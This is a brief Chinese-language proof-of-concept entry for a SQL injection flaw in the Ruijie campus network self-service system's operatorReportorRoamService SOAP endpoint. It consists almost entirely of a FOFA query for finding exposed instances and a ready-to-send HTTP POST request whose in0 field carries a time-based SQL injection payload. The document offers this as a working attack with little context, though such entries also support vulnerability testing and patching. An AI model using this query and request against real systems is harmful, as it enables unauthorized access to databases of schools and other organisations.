## 锐捷校园网自助服务系统operatorReportorRoamService存在SQL注入漏洞

## fofa
```
title=="校园网自助服务系统"
```

## poc
```
POST /selfservice/service/operatorReportorRoamService HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Connection: close
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com">
<soapenv:Header/>
    <soapenv:Body>
    <ser:queryOperatorUuid>
      <!--type: string-->
      <ser:in0>';WAITFOR DELAY '0:0:5'--</ser:in0>
    </ser:queryOperatorUuid>
    </soapenv:Body>
</soapenv:Envelope>

```
